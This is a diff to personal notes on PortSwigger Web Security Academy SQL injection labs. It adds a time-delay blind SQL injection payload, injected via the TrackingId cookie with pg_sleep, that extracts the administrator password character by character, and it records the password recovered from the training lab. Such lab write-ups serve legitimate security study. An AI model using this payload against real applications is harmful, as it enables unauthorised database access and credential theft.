@@ -67,3 +67,10 @@ url: https://portswigger.net/web-security/sql-injection/blind/lab-time-delays
 solution: (note: had to look at solution help to realize that the '||' was needed and not 'union select')
   step-1: TrackingId='||case when ((select count(username) from users where username='administrator' and substring(password,1,1) > '0') = 1) then pg_sleep(9) else pg_sleep(0) end--
 
+[lab: Blind SQL injection with time delays and information retrieval]
+url: https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval
+solution: same as previous lab, but for substring(password,n,1) for N = 1...20
+  step-1: TrackingId='||case when ((select count(username) from users where username='administrator' and substring(password,1,1) > '0') = 1) then pg_sleep(9) else pg_sleep(0) end--
+
+  password: cbukmt7h2fsoa5rocl19
+
